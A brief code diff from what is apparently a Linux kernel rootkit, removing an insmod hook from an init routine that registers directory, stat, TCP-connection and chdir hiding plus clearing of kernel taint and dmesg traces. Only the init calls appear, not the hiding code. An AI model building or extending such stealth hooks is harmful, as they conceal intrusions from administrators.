@@ -26,7 +26,6 @@ static int __init singularity_init(void) {
     ret |= hiding_directory_init();
     ret |= hiding_stat_init();
     ret |= hiding_tcp_init();
-    ret |= hooking_insmod_init();
     ret |= clear_taint_dmesg_init();
     ret |= hooks_write_init();
     ret |= hiding_chdir_init();
